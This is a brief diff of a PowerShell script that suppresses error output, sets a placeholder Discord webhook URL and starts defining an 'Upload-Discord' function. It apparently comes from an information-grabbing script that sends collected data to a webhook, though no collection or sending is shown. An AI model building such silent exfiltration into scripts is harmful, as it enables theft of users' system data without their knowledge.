@@ -2,8 +2,8 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 #Hide Errors
 $ErrorActionPreference = 'SilentlyContinue'
-# Define Discord webhook URL in GetInfo.txt
-$hookUrl
+# Define Discord webhook URL
+$hookUrl = "your-hook-url"
 #Define sending-to-discord function
 function Upload-Discord {
     [CmdletBinding()]
